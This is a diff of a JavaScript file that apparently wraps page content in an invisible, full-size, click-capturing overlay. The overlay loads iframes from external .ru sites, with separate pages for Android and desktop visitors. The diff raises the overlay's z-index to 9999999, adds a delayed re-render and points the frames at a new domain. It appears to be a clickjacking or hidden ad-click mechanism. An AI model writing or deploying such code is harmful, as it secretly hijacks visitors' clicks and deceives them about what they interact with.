@@ -10,7 +10,8 @@ function isMyAndroid() {
 function getClientDomain(){
 var fromUrl = (window.location != window.parent.location) ? document.referrer : document.location.href;
 
-var hostname = (new URL(fromUrl)).hostname;
+    var matches = fromUrl.match(/^https?\:\/\/([^\/?#]+)(?:[\/?#]|$)/i);
+    var hostname = matches && matches[1];  // domain will be null if no match is found
 
 return hostname;
 };
@@ -94,7 +95,7 @@ function Wrapper(container){
 	self.destructor();
 	return;
 	  }
-	  console.log(155);
+	  
 	  cnt--;
 	  self.span.innerHTML=getRemaining(cnt);
 	  setTimeout(function (){
@@ -104,7 +105,7 @@ function Wrapper(container){
 	this.WrapperDiv=document.createElement('div');
 	this.WrapperDiv.className = "mp-wrapper";
 	this.WrapperDiv.style.position = "absolute";
-	this.WrapperDiv.style.zIndex = 10000;
+	this.WrapperDiv.style.zIndex = 9999999;
     this.WrapperDiv.style.cursor = "pointer";
     this.WrapperDiv.style.opacity = 0;
 	this.WrapperDiv.style.filter="alpha(Opacity=0)";
@@ -125,6 +126,15 @@ function Wrapper(container){
 	window.addEventListener('resize', function(){
 	self.render();
 	}, false);
+	
+	
+	
+
+    setTimeout(function func() {
+    self.render();
+    }, 1500);
+
+
     window.addEventListener('scroll', function(e) {
 	self.render();
 	}, false);
@@ -199,10 +209,15 @@ var size = {width: this.container.scrollWidth, height: this.container.scrollHeig
         this.frame.style.border = "0";
         this.frame.style.margin = "0";
 		 if (isMyAndroid()) {
-			this.frame.src = "//apptoday.ru/dev/android.html?index=" + this.index;
+			//this.frame.src = "//apptoday.ru/dev/android.html?index=" + this.index;
+			//this.frame.src = "//kinodrevo.ru/frames/android.html?index=" + this.index;
+			this.frame.src = "//i-trailer.ru/player/html5/osipov/android.html?index=" + this.index;
         } else {
             this.frame.style.display = "none";
-			this.frame.src = "//apptoday.ru/dev/desctop.html?index=" + this.index;
+			//this.frame.src = "//apptoday.ru/dev/desctop.html?index=" + this.index;
+			//this.frame.src = "//kinodrevo.ru/frames/desctop.html?index=" + this.index;
+
+			this.frame.src = "//i-trailer.ru/player/html5/osipov/desctop.html?index=" + this.index;
         }
 		this.WrapperDiv.appendChild(this.frame);
     };
